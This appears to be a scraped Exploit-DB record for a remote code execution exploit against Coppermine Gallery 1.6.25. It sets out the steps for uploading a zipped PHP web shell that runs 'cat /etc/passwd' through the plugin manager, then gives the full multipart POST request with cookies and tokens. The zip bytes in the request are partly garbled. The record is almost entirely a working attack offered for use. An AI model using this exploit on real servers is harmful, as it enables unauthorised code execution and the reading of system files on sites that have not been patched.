{"source": "https://www.exploit-db.com/exploits/51738", "vulnName": "Coppermine Gallery 1.6.25 - RCE", "vulnEDBID": "51738", "vulnCVE": "N/A", "author": "MIRABBAS A\u011eALAROV", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2023-10-09", "vulnContent": "Exploit Title: coppermine-gallery 1.6.25 RCE\nApplication: coppermine-gallery\nVersion: v1.6.25  \nBugs:  RCE\nTechnology: PHP\nVendor URL: https://coppermine-gallery.net/\nSoftware Link: https://github.com/coppermine-gallery/cpg1.6.x/archive/refs/tags/v1.6.25.zip\nDate of found: 05.09.2023\nAuthor: Mirabbas A\u011falarov\nTested on: Linux \n\n\n2. Technical Details & POC\n========================================\nsteps\n\n\n1.First of All create php file content as <?php echo system('cat /etc/passwd'); ?> and sequeze this file with zip.\n$ cat >> test.php \n<?php echo system('cat /etc/passwd'); ?>\n$ zip test.zip test.php\n\n1. Login to account\n2. Go to http://localhost/cpg1.6.x-1.6.25/pluginmgr.php\n3. Upload zip file\n4. Visit to php file   http://localhost/cpg1.6.x-1.6.25/plugins/test.php\n\n\n\npoc request\n\nPOST /cpg1.6.x-1.6.25/pluginmgr.php?op=upload HTTP/1.1\nHost: localhost\nContent-Length: 630\nCache-Control: max-age=0\nsec-ch-ua: \nsec-ch-ua-mobile: ?0\nsec-ch-ua-platform: \"\"\nUpgrade-Insecure-Requests: 1\nOrigin: http://localhost\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryi1AopwPnBYPdzorF\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: http://localhost/cpg1.6.x-1.6.25/pluginmgr.php\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9\nCookie: cpg16x_data=YTo0OntzOjI6IklEIjtzOjMyOiI0MmE1Njk2NzhhOWE3YTU3ZTI2ZDgwYThlYjZkODQ4ZCI7czoyOiJhbSI7aToxO3M6NDoibGFuZyI7czo3OiJlbmdsaXNoIjtzOjM6ImxpdiI7YTowOnt9fQ%3D%3D; cpg16x_fav=YToxOntpOjA7aToxO30%3D; d4e0836e1827aa38008bc6feddf97eb4=93ffa260bd94973848c10e15e50b342c\nConnection: close\n\n------WebKitFormBoundaryi1AopwPnBYPdzorF\nContent-Disposition: form-data; name=\"plugin\"; filename=\"test.zip\"\nContent-Type: application/zip\n\nPK\u0003\u0004\n\ufffd\ufffd\ufffd\ufffd\ufffd\u0099b%Wz\u00bd\u00b5}(\ufffd\ufffd\ufffd(\ufffd\ufffd\ufffd\b\ufffd\u001c\ufffdtest.phpUT \ufffd\u0003\u00f1\u00f2\u00f6d\u00d3\u00f2\u00f6dux \ufffd\u0001\u0004\ufffd\ufffd\ufffd\ufffd\u0004\ufffd\ufffd\ufffd\ufffd<?php echo system('cat /etc/passwd');?>\nPK\u0001\u0002\u001e\u0003\n\ufffd\ufffd\ufffd\ufffd\ufffd\u0099b%Wz\u00bd\u00b5}(\ufffd\ufffd\ufffd(\ufffd\ufffd\ufffd\b\ufffd\u0018\ufffd\ufffd\ufffd\ufffd\ufffd\u0001\ufffd\ufffd\ufffd\u00a4\u0081\ufffd\ufffd\ufffd\ufffdtest.phpUT\u0005\ufffd\u0003\u00f1\u00f2\u00f6dux \ufffd\u0001\u0004\ufffd\ufffd\ufffd\ufffd\u0004\ufffd\ufffd\ufffd\ufffdPK\u0005\u0006\ufffd\ufffd\ufffd\ufffd\u0001\ufffd\u0001\ufffdN\ufffd\ufffd\ufffdj\ufffd\ufffd\ufffd\ufffd\ufffd\n------WebKitFormBoundaryi1AopwPnBYPdzorF\nContent-Disposition: form-data; name=\"form_token\"\n\n50982f2e64a7bfa63dbd912a7fdb4e1e\n------WebKitFormBoundaryi1AopwPnBYPdzorF\nContent-Disposition: form-data; name=\"timestamp\"\n\n1693905214\n------WebKitFormBoundaryi1AopwPnBYPdzorF--\n            "}